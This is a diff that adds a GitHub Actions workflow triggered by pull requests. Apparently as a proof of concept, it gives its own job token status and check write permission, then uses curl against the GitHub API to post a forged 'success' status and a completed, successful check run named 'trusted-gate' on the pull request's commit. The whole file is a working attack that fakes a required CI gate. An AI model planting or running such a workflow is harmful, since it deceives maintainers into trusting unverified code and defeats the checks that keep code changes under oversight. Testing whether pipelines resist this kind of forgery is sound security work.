@@ -1,0 +1,20 @@
+name: poster
+on: pull_request
+permissions:
+  statuses: write
+  checks: write
+jobs:
+  post:
+    name: post
+    runs-on: ubuntu-latest
+    steps:
+      - name: Post forged results with the self-granted token
+        env:
+          TOKEN: ${{ github.token }}
+          SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          sleep 50
+          s=$(curl -s -o /tmp/s.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json"             "https://api.github.com/repos/$GITHUB_REPOSITORY/statuses/$SHA"             -d '{"state":"success","context":"trusted-gate","description":"forged by candidate workflow"}')
+          echo "forged_status_http=$s"; head -c 600 /tmp/s.json; echo
+          c=$(curl -s -o /tmp/c.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json"             "https://api.github.com/repos/$GITHUB_REPOSITORY/check-runs"             -d "{\"name\":\"trusted-gate\",\"head_sha\":\"$SHA\",\"status\":\"completed\",\"conclusion\":\"success\",\"output\":{\"title\":\"forged\",\"summary\":\"forged by candidate workflow\"}}")
+          echo "forged_checkrun_http=$c"; head -c 600 /tmp/c.json; echo
